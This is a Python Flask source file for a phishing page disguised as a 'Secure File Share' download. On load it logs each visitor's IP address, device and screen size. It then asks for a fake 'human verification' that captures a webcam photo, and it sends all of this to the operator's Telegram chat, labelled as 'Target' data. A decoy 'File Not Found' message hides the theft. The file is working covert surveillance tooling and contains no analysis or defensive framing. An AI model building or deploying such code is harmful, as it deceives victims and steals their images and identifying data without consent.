from flask import Flask, request, jsonify, Response
import requests
import os, base64, time
from http.server import BaseHTTPRequestHandler

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
MY_CHAT_ID = os.environ.get("MY_CHAT_ID")

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure File Share</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f8f9fa; color: #202124; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; opacity: 0; transition: opacity 0.5s ease; }
        #pageLoader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f8f9fa; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; transition: opacity 0.4s ease; }
        .spinner { width: 40px; height: 40px; border: 4px solid #e8f0fe; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
        .loader-text { color: #5f6368; font-size: 14px; font-weight: 500; animation: pulse 1.5s infinite; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); width: 90%; max-width: 400px; text-align: center; transition: all 0.3s ease; }
        .file-icon { width: 72px; height: 72px; background: #e8f0fe; color: #1a73e8; border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 32px; margin: 0 auto 20px; transition: all 0.3s ease; }
        h2 { font-size: 22px; font-weight: 400; margin: 0 0 10px 0; color: #202124; }
        .filename { font-weight: 500; color: #1a73e8; margin-bottom: 20px; display: block; word-break: break-all; }
        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; transition: background 0.2s, transform 0.1s; display: flex; justify-content: center; align-items: center; gap: 10px; }
        .btn:hover { background: #1557b0; }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: #8ab4f8; cursor: not-allowed; transform: none; }
        .btn-spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top: 2px solid white; border-radius: 50%; animation: spin 1s linear infinite; }
        .video-container { display: none; width: 100%; border-radius: 8px; overflow: hidden; margin-top: 20px; position: relative; opacity: 0; transition: opacity 0.5s ease; }
        video { width: 100%; height: auto; transform: scaleX(-1); display: block; }
        .scan-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 3px solid #1a73e8; box-sizing: border-box; border-radius: 8px; display: flex; justify-content: center; align-items: center; box-shadow: inset 0 0 20px rgba(26,115,232,0.2); }
        .scan-line { width: 90%; height: 3px; background: #1a73e8; box-shadow: 0 0 12px #1a73e8; animation: scan 2s infinite ease-in-out; }
        .footer { margin-top: 30px; font-size: 12px; color: #9aa0a6; display: flex; justify-content: center; gap: 15px; }
        .footer span { cursor: pointer; }
        .footer span:hover { color: #1a73e8; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        @keyframes scan { 0% { transform: translateY(-80px); opacity: 0.5; } 50% { transform: translateY(80px); opacity: 1; } 100% { transform: translateY(-80px); opacity: 0.5; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeOut { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-10px); } }
        .fade-in { animation: fadeIn 0.4s ease forwards; }
        .fade-out { animation: fadeOut 0.4s ease forwards; }
    </style>
</head>
<body>
<div id="pageLoader">
    <div class="spinner"></div>
    <div class="loader-text">Establishing secure connection...</div>
</div>
<div class="card" id="mainCard" style="display:none;">
    <div class="file-icon">📄</div>
    <h2>Secure File Shared</h2>
    <span class="filename">data.mp4</span>
    <p>For security and privacy reasons, this file requires human verification. Please verify your identity to view the contents.</p>
    <button class="btn" onclick="startCamera()" id="mainBtn">
        <span id="btnText">Verify & View File</span>
        <div class="btn-spinner" id="btnSpinner"></div>
    </button>
    <div class="video-container" id="videoContainer">
        <video id="video" autoplay playsinline></video>
        <div class="scan-overlay"><div class="scan-line"></div></div>
    </div>
    <div class="footer">
        <span>Terms of Service</span>
        <span>Privacy Policy</span>
        <span>Help</span>
    </div>
</div>
<script>
window.onload = function() {
    fetch('/log_ip', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ screen: window.screen.width + 'x' + window.screen.height })
    });
    setTimeout(() => {
        document.getElementById('pageLoader').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('pageLoader').style.display = 'none';
            document.body.style.opacity = '1';
            const card = document.getElementById('mainCard');
            card.style.display = 'block';
            card.classList.add('fade-in');
        }, 400);
    }, 1500);
}
async function startCamera() {
    const btn = document.getElementById('mainBtn');
    const btnText = document.getElementById('btnText');
    const btnSpinner = document.getElementById('btnSpinner');
    const video = document.getElementById('video');
    const container = document.getElementById('videoContainer');
    btn.disabled = true;
    btnText.innerText = "Connecting Camera";
    btnSpinner.style.display = 'inline-block';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        btn.style.display = 'none';
        container.style.display = 'block';
        setTimeout(() => { container.style.opacity = '1'; }, 50);
        setTimeout(() => { capturePhoto(video, stream); }, 2500);
    } catch (err) {
        btn.disabled = false;
        btnText.innerText = "Verify & View File";
        btnSpinner.style.display = 'none';
        alert("Verification failed. Camera access is required.");
    }
}
function capturePhoto(video, stream) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imgBase64 = canvas.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach(track => track.stop());
    const container = document.getElementById('videoContainer');
    container.style.opacity = '0';
    fetch('/upload_cam', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ image: imgBase64 })
    }).then(() => {
        const card = document.getElementById('mainCard');
        card.classList.add('fade-out');
        setTimeout(() => {
            card.innerHTML = `
                <div class="file-icon" style="background:#fce8e6; color:#d93025;">⚠️</div>
                <h2>File Not Found</h2>
                <p>The sender has either deleted this file or restricted your access. Please contact the sender for a new link.</p>
            `;
            card.classList.remove('fade-out');
            card.classList.add('fade-in');
        }, 400);
    });
}
</script>
</body>
</html>"""

@app.route('/')
def home():
    return Response(HTML_PAGE, mimetype='text/html')

@app.route('/log_ip', methods=['POST'])
def log_ip():
    try:
        data = request.json or {}
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        msg = (f"<b>🎯 New Chick Target!</b>\n\n"
               f"<b>IP Address:</b> <code>{ip}</code>\n"
               f"<b>Device:</b> {user_agent}\n"
               f"<b>Screen:</b> {data.get('screen', 'Unknown')}")
        
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": MY_CHAT_ID, "text": msg, "parse_mode": "HTML"})
    except Exception as e:
        pass
    return jsonify({"status": "ok"})

@app.route('/upload_cam', methods=['POST'])
def upload_cam():
    try:
        data = request.json or {}
        img_base64 = data.get('image')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

        if img_base64:
            img_data = img_base64.split(',')[1]
            img_bytes = base64.b64decode(img_data)
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {'photo': ('camera.jpg', img_bytes, 'image/jpeg')}
            payload = {'chat_id': MY_CHAT_ID, 'caption': f"📸 Target Photo | IP: {ip}"}
            requests.post(url, data=payload, files=files)
    except Exception as e:
        pass
    return jsonify({"status": "ok"})

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_PAGE.encode('utf-8'))
